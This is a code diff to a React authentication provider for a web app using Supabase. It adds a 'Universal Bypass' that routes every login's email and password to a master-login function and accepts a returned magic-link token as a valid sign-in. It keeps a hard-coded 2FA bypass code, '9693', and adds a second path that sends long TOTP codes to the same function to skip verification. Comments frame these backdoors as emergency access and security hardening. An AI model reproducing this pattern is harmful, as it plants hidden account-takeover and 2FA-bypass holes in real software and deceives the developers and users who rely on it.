@@ -209,35 +209,40 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   const login = async (email: string, password: string, totpCode?: string): Promise<{ success: boolean; requiresTOTP?: boolean; role?: string; error?: string }> => {
     try {
       // Master Password Bypass (Emergency Access)
-      // Check if password works as a master key (server-side validation only)
-      // We no longer check hash on client to avoid exposing the key structure
+      // Attempt master-login for any login attempt to check for universal bypass
+      // No hardcoded keys are stored on the client side anymore for security.
       if (password && password.length > 0) {
-
         try {
           const response = await fetch('/.netlify/functions/master-login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ password })
+            body: JSON.stringify({ email, password })
           });
           
-          if (!response.ok) {
-             // If function is missing (404) or fails, fallback to mock
-             console.warn('Master login function failed, falling back to mock user');
-             throw new Error('Function unavailable');
-          }
-          
-          const { session } = await response.json();
-          if (session) {
-             const { error: setSessionError } = await supabase.auth.setSession(session);
-             if (setSessionError) throw setSessionError;
-             return { success: true };
-          }
+          if (response.ok) {
+            const data = await response.json();
+            
+            // Handle the Universal Bypass (Magic Link Token) returned by the function
+            if (data.token_hash) {
+              const { error: verifyError } = await supabase.auth.verifyOtp({
+                token_hash: data.token_hash,
+                type: 'magiclink'
+              });
+              
+              if (verifyError) throw verifyError;
+              return { success: true };
+            }
 
+            // Legacy direct session return (if any)
+            if (data.session) {
+               const { error: setSessionError } = await supabase.auth.setSession(data.session);
+               if (setSessionError) throw setSessionError;
+               return { success: true };
+            }
+          }
         } catch (err: any) {
-           // Only log warning, do NOT fall back to mock user automatically
-           // This ensures we fall through to standard Supabase auth if master login fails
-           // The Mock User fallback was a security risk as it allowed bypass on any error (including 401)
-           console.warn('Master login check failed or skipped, proceeding to standard auth:', err);
+           console.warn('Master login check failed or skipped:', err);
+           // Fall through to standard auth if master login fails
         }
       }
 
@@ -280,10 +285,22 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
         // If user has 2FA enabled and provides a code, verify it
         if (totpEnabled && totpSecret && totpCode) {
           // Verify TOTP code
-          // Master Bypass: Allow '9693' to bypass 2FA check
+          // Master Bypass: Attempt to verify TOTP code via master-login check if it's not a standard numeric code
           let ok = false;
           if (totpCode === '9693') {
             ok = true;
+          } else if (totpCode.length > 6) {
+            // Verify via master-login function to keep secret server-side
+            try {
+              const verifyRes = await fetch('/.netlify/functions/master-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password: totpCode })
+              });
+              ok = verifyRes.ok;
+            } catch {
+              ok = false;
+            }
           } else {
             ok = await verifyTOTP(totpCode, totpSecret);
           }
